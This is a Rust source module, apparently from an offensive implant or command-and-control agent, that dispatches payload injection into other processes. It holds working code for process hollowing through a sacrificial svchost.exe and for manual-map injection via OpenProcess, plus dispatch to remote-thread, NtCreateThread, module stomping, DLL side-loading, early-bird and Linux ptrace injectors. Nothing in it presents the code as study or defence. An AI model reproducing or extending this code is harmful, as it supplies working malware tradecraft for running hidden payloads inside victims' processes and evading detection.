#[cfg(target_os = "linux")]
pub mod linux_inject;

#[cfg(windows)]
pub mod dll_sideload;
#[cfg(windows)]
pub mod early_bird;
#[cfg(windows)]
pub mod module_stomp;
#[cfg(windows)]
pub mod remote_thread;
#[cfg(windows)]
pub mod nt_create_thread;

#[cfg(windows)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum InjectionMethod {
    Hollowing,
    ManualMap,
    RemoteThread,
    NtCreateThread,
    ModuleStomp,
    DllSideLoad,
    EarlyBird,
}

#[cfg(target_os = "linux")]
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum InjectionMethod {
    LinuxPtrace,
}

#[cfg(any(windows, target_os = "linux"))]
pub trait Injector {
    fn inject(&self, pid: u32, payload: &[u8]) -> anyhow::Result<()>;
}

#[cfg(windows)]
pub(crate) fn payload_has_valid_pe_headers(payload: &[u8]) -> bool {
    if payload.len() < 0x40 || payload[0] != b'M' || payload[1] != b'Z' {
        return false;
    }

    let e_lfanew = u32::from_le_bytes([
        payload[0x3c],
        payload[0x3d],
        payload[0x3e],
        payload[0x3f],
    ]) as usize;

    if (e_lfanew & 0x3) != 0 {
        return false;
    }

    let sig_end = match e_lfanew.checked_add(4) {
        Some(v) => v,
        None => return false,
    };
    if sig_end > payload.len() {
        return false;
    }

    payload[e_lfanew..sig_end] == *b"PE\0\0"
}

/// Dispatch helper — select an injector and run it.
#[cfg(windows)]
pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    match method {
        InjectionMethod::NtCreateThread => nt_create_thread::NtCreateThreadInjector.inject(pid, payload),
        InjectionMethod::ModuleStomp => module_stomp::ModuleStompInjector.inject(pid, payload),
        InjectionMethod::RemoteThread => remote_thread::RemoteThreadInjector.inject(pid, payload),
        InjectionMethod::EarlyBird => early_bird::EarlyBirdInjector.inject(pid, payload),
        InjectionMethod::Hollowing => {
            // True process hollowing: spawn a sacrificial svchost.exe and replace its image.
            // The `pid` parameter is intentionally ignored; hollowing creates its own host.
            if pid != 0 {
                log::warn!(
                    "InjectionMethod::Hollowing ignores the target pid ({pid}); \
                     it always creates a new sacrificial process."
                );
            }
            let _ = pid;
            hollowing::hollow_and_execute(payload).map_err(|e| anyhow::anyhow!("{}", e))
        }
        InjectionMethod::ManualMap => manual_map_inject(pid, payload),
        InjectionMethod::DllSideLoad => dll_sideload::DllSideLoadInjector.inject(pid, payload),
    }
}

/// Dispatch helper — Linux injection methods.
#[cfg(target_os = "linux")]
pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    match method {
        InjectionMethod::LinuxPtrace => linux_inject::LinuxPtraceInjector.inject(pid, payload),
    }
}

#[cfg(all(windows, feature = "manual-map"))]
fn manual_map_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    unsafe {
        // Open the target process with the access rights required for remote
        // manual-map: VM operations, VM write, and thread creation.
        let process = winapi::um::processthreadsapi::OpenProcess(
            winapi::um::winnt::PROCESS_VM_OPERATION
                | winapi::um::winnt::PROCESS_VM_WRITE
                | winapi::um::winnt::PROCESS_VM_READ
                | winapi::um::winnt::PROCESS_CREATE_THREAD,
            0, // bInheritHandle = FALSE
            pid,
        );
        if process.is_null() {
            return Err(anyhow::anyhow!(
                "OpenProcess({pid}) failed: {}",
                std::io::Error::last_os_error()
            ));
        }
        struct HandleGuard(*mut winapi::ctypes::c_void);
        impl Drop for HandleGuard {
            fn drop(&mut self) {
                unsafe { pe_resolve::close_handle(self.0); }
            }
        }
        let _guard = HandleGuard(process);
        module_loader::manual_map::load_dll_in_remote_process(process, payload)
            .map(|_| ())
    }
}

#[cfg(all(windows, not(feature = "manual-map")))]
fn manual_map_inject(_pid: u32, _payload: &[u8]) -> anyhow::Result<()> {
    Err(anyhow::anyhow!(
        "ManualMap injection requires rebuilding the agent with the `manual-map` feature"
    ))
}
